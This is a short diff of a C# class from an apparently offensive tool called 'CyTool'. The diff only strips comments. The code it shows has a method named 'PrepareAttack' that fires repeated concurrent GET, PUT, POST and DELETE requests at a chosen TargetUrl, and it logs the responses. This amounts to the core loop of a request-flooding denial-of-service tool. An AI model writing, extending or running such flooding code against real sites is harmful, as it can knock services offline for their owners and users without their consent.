@@ -14,7 +14,7 @@ namespace CyTool.Models
         public string TargetUrl { get; set; }
         public int Count { get; set; }
         public ObservableCollection<string> RequestLogs { get; set; } = new ObservableCollection<string>();
-        private static readonly HttpClient client = new HttpClient(); // Singleton HttpClient
+        private static readonly HttpClient client = new HttpClient();
 
         public async Task<List<Task>> PrepareAttack()
         {
@@ -25,19 +25,15 @@ namespace CyTool.Models
 
             for (int i = 0; i < Count; i++)
             {
-                // Handle GET request
                 var attackGet = SendRequestAsync(() => client.GetAsync(TargetUrl), "GET");
                 attacks.Add(attackGet);
 
-                // Handle PUT request
                 var attackPut = SendRequestAsync(() => client.PutAsync(TargetUrl, new StringContent("")), "PUT");
                 attacks.Add(attackPut);
 
-                // Handle POST request
                 var attackPost = SendRequestAsync(() => client.PostAsync(TargetUrl, new StringContent("")), "POST");
                 attacks.Add(attackPost);
 
-                // Handle DELETE request
                 var attackDelete = SendRequestAsync(() => client.DeleteAsync(TargetUrl), "DELETE");
                 attacks.Add(attackDelete);
             }
